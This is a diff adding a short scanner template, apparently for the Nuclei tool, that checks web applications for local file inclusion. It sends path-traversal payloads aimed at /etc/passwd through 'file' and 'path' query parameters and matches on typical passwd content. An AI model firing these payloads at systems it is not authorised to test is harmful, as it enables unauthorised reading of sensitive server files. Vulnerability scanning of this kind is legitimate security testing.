@@ -1,0 +1,21 @@
+id: ai-lfi-basic
+
+info:
+  name: Basic Local File Inclusion
+  severity: critical
+  author: reewardius
+  tags: lfi,web
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=../../../../../../etc/passwd"
+      - "{{BaseURL}}/?path=../../../../../../etc/passwd"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        words:
+          - "root:x:"
+          - "/bin/bash"
+        condition: or
